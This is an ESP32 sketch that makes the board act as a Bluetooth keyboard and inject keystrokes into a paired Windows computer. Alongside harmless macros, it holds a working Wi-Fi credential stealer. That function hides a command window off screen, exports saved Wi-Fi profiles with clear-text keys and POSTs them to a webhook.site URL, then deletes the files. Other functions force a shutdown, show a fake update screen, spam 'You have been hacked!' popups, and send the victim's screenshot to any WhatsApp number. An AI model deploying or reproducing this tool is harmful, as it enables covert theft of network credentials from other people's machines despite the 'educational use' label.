#include <BleKeyboard.h>

BleKeyboard bleKeyboard("ESP32_Keyboard", "ESP32_Inc", 100);
bool websiteOpened = false;

void setup() {
  Serial.begin(115200);
  bleKeyboard.begin();
  Serial.println("🔄 Type 'help' to see available commands.");
}

void typeSlow(String text, int charDelay = 40) {
  for (int i = 0; i < text.length(); i++) {
    bleKeyboard.print(String(text[i]));
    delay(charDelay);
  }
}

void pressWinCombo(char keyChar) {
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press(keyChar);
  delay(100);
  bleKeyboard.releaseAll();
  delay(500);
}

void sendCtrlKey(char keyChar) {
  bleKeyboard.press(KEY_LEFT_CTRL);
  bleKeyboard.press(tolower(keyChar));
  delay(100);
  bleKeyboard.releaseAll();
}

void sendArrowKey(String direction) {
  direction.toUpperCase();
  if (direction == "LEFT") bleKeyboard.write(KEY_LEFT_ARROW);
  else if (direction == "RIGHT") bleKeyboard.write(KEY_RIGHT_ARROW);
  else if (direction == "UP") bleKeyboard.write(KEY_UP_ARROW);
  else if (direction == "DOWN") bleKeyboard.write(KEY_DOWN_ARROW);
}

void takeScreenshot() {
  bleKeyboard.press(KEY_PRTSC);
  delay(100);
  bleKeyboard.releaseAll();
}

void openNotepad() {
  pressWinCombo('r');
  typeSlow("notepad");
  bleKeyboard.write(KEY_RETURN);
}

void openCMD() {
  pressWinCombo('r');
  typeSlow("cmd");
  bleKeyboard.write(KEY_RETURN);
}

void shutdownPC() {
  pressWinCombo('r');
  typeSlow("shutdown /s /f /t 5");
  bleKeyboard.write(KEY_RETURN);
}

void lockPC() {
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('l');
  delay(100);
  bleKeyboard.releaseAll();
}

void closeWindow() {
  bleKeyboard.press(KEY_LEFT_ALT);
  bleKeyboard.press(KEY_F4);
  delay(100);
  bleKeyboard.releaseAll();
}

void openInstagram() {
  pressWinCombo('r');
  typeSlow("https://www.instagram.com/linuxndroid");
  bleKeyboard.write(KEY_RETURN);
}

void stealWifiSilent() {
 Serial.println("🕵️ Running advanced Wi-Fi stealer silently...");
  pressWinCombo('r');
  delay(500);

  // Open small CMD window
  typeSlow("cmd /k mode con: cols=15 lines=1");
  bleKeyboard.write(KEY_RETURN);
  delay(1500);

  // Simulate ALT+SPACE → M → Move down → Enter (to push CMD off screen)
  bleKeyboard.press(KEY_LEFT_ALT);
  bleKeyboard.press(' ');
  delay(100);
  bleKeyboard.releaseAll();
  delay(100);
  bleKeyboard.write('m');
  delay(200);
  for (int i = 0; i < 100; i++) {
    bleKeyboard.write(KEY_DOWN_ARROW);
    delay(10);
  }
  bleKeyboard.write(KEY_RETURN);
  delay(300);

  // Go to temp folder
  typeSlow("cd %temp%");
  bleKeyboard.write(KEY_RETURN);
  delay(500);

  // Export Wi-Fi profiles with clear keys
  typeSlow("netsh wlan export profile key=clear");
  bleKeyboard.write(KEY_RETURN);
  delay(1000);

  // Extract passwords into Wi-Fi-PASS
  typeSlow("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
  bleKeyboard.write(KEY_RETURN);
  delay(1000);

  // Send passwords to webhook
  typeSlow("powershell Invoke-WebRequest -Uri https://webhook.site/4ec7c917-7b1d-4f65-b020-b591dd0512da -Method POST -InFile Wi-Fi-PASS");
  bleKeyboard.write(KEY_RETURN);
  delay(1500);

  // Clean up files
  typeSlow("del Wi-* /s /f /q");
  bleKeyboard.write(KEY_RETURN);
  delay(500);

  // Exit CMD
  typeSlow("exit");
  bleKeyboard.write(KEY_RETURN);
  delay(500);
}

void AboutUs() {
  Serial.println();
  Serial.println("📃 === ABOUT US ===");
  Serial.println();
  Serial.println("👨‍💻 Project Created By: Linuxndroid & Krishna Rajput");
  Serial.println("📚 Purpose: Educational Use & Learning ESP32 HID (Ducky Style)");
  Serial.println();
  Serial.println("💡 Hacker Quotes:");
  Serial.println("\"Hack the planet!\"");
  Serial.println("\"The quieter you become, the more you are able to hear.\"");
  Serial.println("\"It's not a bug, it's a feature...\" 😎");
  Serial.println();
  Serial.println("🔗 Follow Us:");
  Serial.println("Linuxndroid YouTube: https://youtube.com/Linuxndroid");
  Serial.println();
  Serial.println("⚠️  Use responsibly. Knowledge is power — use it wisely.");
  Serial.println("=======================");
}
void runFakeBSOD() {
  pressWinCombo('r');
  delay(500);
  typeSlow("msedge --kiosk https://fakeupdate.net/win10/"); // or "chrome --kiosk"
  bleKeyboard.write(KEY_RETURN);
}
void popupAlertSpam() {
  openCMD();
  delay(500);
  typeSlow("for /l %i in (1,1,20) do start cmd /c \"echo msgbox \\\"You have been hacked!\\\" > %temp%\\a.vbs & start %temp%\\a.vbs\"");
  bleKeyboard.write(KEY_RETURN);
}
void showHelp() {
  Serial.println("🆘 Available Commands:");
  Serial.println("----------------------------------");
  Serial.println("▶ notepad         → Open Notepad");
  Serial.println("▶ youtube <search> → Open YouTube");
  Serial.println("▶ google <search>  → Open Google");
  Serial.println("▶ whatsapp <no> <msg> → Send message to WhatsApp");
  Serial.println("▶ wp-ss <no>      → Send Screenshot to WhatsApp");
  Serial.println("▶ cmd             → Open Command Prompt");
  Serial.println("▶ shutdown        → Shutdown PC in 5 sec");
  Serial.println("▶ run             → Open Run Dialog (Win + R)");
  Serial.println("▶ url <Command>   → Open custom Command in Run Box");
  Serial.println("▶ lock            → Lock the PC");
  Serial.println("▶ close           → Close current app");
  Serial.println("▶ ENTER           → Press Enter key");
  Serial.println("▶ screenshot      → Take screenshot");
  Serial.println("▶ CTRL+<key>      → CTRL+A, CTRL+C, CTRL+V, e.g.");
  Serial.println("▶ WIN / LEFT / RIGHT / UP / DOWN → Arrow keys");
  Serial.println("▶ WiFi            → Dump Wifi Password Target");
  Serial.println("▶ Fake            → Fake Update Show Target");
  Serial.println("▶ Spam            → Spam Box Show Target");
  Serial.println("▶ help            → Show this help list");
  Serial.println("▶ About           → Show creator info");
  Serial.println("----------------------------------");
}

void sendWhatsAppMessage(String number, String message) {
  String url = "https://wa.me/+" + number + "?text=" + message;
  pressWinCombo('r');
  typeSlow(url);
  delay(300);
  bleKeyboard.write(KEY_RETURN);
  delay(4000);
  bleKeyboard.write(KEY_DOWN_ARROW);
  delay(300);
  bleKeyboard.write(KEY_RETURN);
  delay(5000);
}

void openWhatsAppWeb() {
  pressWinCombo('r');
  typeSlow("https://wa.me/");
  delay(300);
  bleKeyboard.write(KEY_RETURN);
  delay(4000);
  bleKeyboard.write(KEY_DOWN_ARROW);
  delay(300);
  bleKeyboard.write(KEY_RETURN);
  delay(5000);
}

void sendScreenshotToWhatsApp(String number) {
  takeScreenshot();
  delay(1000);
  String url = "https://wa.me/+" + number + "?text=";
  pressWinCombo('r');
  typeSlow(url);
  delay(300);
  bleKeyboard.write(KEY_RETURN);
  delay(4000);
  bleKeyboard.write(KEY_DOWN_ARROW);
  delay(300);
  bleKeyboard.write(KEY_RETURN);
  delay(5000);
  bleKeyboard.press(KEY_LEFT_CTRL);
  bleKeyboard.press('v');
  delay(2000);
  bleKeyboard.releaseAll();
  bleKeyboard.write(KEY_RETURN);
}

void openYouTubeSearch(String searchQuery) {
  String url = "https://www.youtube.com/results?search_query=" + searchQuery;
  pressWinCombo('r');
  typeSlow(url);
  bleKeyboard.write(KEY_RETURN);
}

void openGoogleSearch(String searchQuery) {
  String url = "https://www.google.com/search?q=" + searchQuery;
  pressWinCombo('r');
  typeSlow(url);
  bleKeyboard.write(KEY_RETURN);
}

void openCustomURL(String url) {
  pressWinCombo('r');
  typeSlow(url);
  bleKeyboard.write(KEY_RETURN);
}

void loop() {
  if (bleKeyboard.isConnected()) {
    if (!websiteOpened) {
      websiteOpened = true;
      
    }

    if (Serial.available()) {
      String input = Serial.readStringUntil('\n');
      input.trim();
      if (input.length() == 0) return;

      if (input.equalsIgnoreCase("whatsapp")) {
        openWhatsAppWeb();
      }

      else if (input.startsWith("whatsapp ")) {
        int firstSpace = input.indexOf(' ');
        int secondSpace = input.indexOf(' ', firstSpace + 1);
        if (secondSpace > 0) {
          String number = input.substring(firstSpace + 1, secondSpace);
          String message = input.substring(secondSpace + 1);
          sendWhatsAppMessage(number, message);
        }
      }

      else if (input.startsWith("wp-ss")) {
        int spaceIndex = input.indexOf(' ');
        if (spaceIndex > 0 && input.length() > spaceIndex + 1) {
          String number = input.substring(spaceIndex + 1);
          sendScreenshotToWhatsApp(number);
        } else {
          openWhatsAppWeb();
        }
      }

      else if (input.startsWith("youtube")) {
        if (input.length() == 7) {
          pressWinCombo('r');
          typeSlow("https://www.youtube.com");
          bleKeyboard.write(KEY_RETURN);
        } else {
          String search = input.substring(8);
          openYouTubeSearch(search);
        }
      }

      else if (input.startsWith("google")) {
        if (input.length() == 6) {
          pressWinCombo('r');
          typeSlow("https://www.google.com");
          bleKeyboard.write(KEY_RETURN);
        } else {
          String search = input.substring(7);
          openGoogleSearch(search);
        }
      }

      else if (input.startsWith("url ")) {
        String site = input.substring(4);
        openCustomURL(site);
      }
      else if (input.equalsIgnoreCase("Wifi")) {
  stealWifiSilent();
}
else if (input.equalsIgnoreCase("Fake")) runFakeBSOD();
      else if (input.equalsIgnoreCase("About")) AboutUs();
      else if (input.equalsIgnoreCase("Spam")) popupAlertSpam();
      else if (input.equalsIgnoreCase("notepad")) openNotepad();
      else if (input.equalsIgnoreCase("cmd")) openCMD();
      else if (input.equalsIgnoreCase("shutdown")) shutdownPC();
      else if (input.equalsIgnoreCase("run")) pressWinCombo('r');
      else if (input.equalsIgnoreCase("lock")) lockPC();
      else if (input.equalsIgnoreCase("close")) closeWindow();
      else if (input.equalsIgnoreCase("ENTER")) bleKeyboard.write(KEY_RETURN);
      else if (input.equalsIgnoreCase("screenshot")) takeScreenshot();
      else if (input.equalsIgnoreCase("win")) {
        bleKeyboard.press(KEY_LEFT_GUI);
        delay(100);
        bleKeyboard.releaseAll();
      }
      else if (input.equalsIgnoreCase("help")) showHelp();

      else if (input.startsWith("CTRL+")) {
        String ctrlPart = input.substring(5);
        ctrlPart.toUpperCase();
        if (ctrlPart.length() == 1) {
          sendCtrlKey(ctrlPart.charAt(0));
        } else {
          for (int i = 0; i < ctrlPart.length(); i++) {
            bleKeyboard.press(ctrlPart.charAt(i));
          }
          delay(100);
          bleKeyboard.releaseAll();
        }
      }

      else if (
        input.equalsIgnoreCase("LEFT") || input.equalsIgnoreCase("RIGHT") ||
        input.equalsIgnoreCase("UP") || input.equalsIgnoreCase("DOWN")) {
        sendArrowKey(input);
      }

      else {
        Serial.print("⌨ Typing plain text: ");
        Serial.println(input);
        typeSlow(input);
      }
    }
  } else {
    websiteOpened = false;
  }
}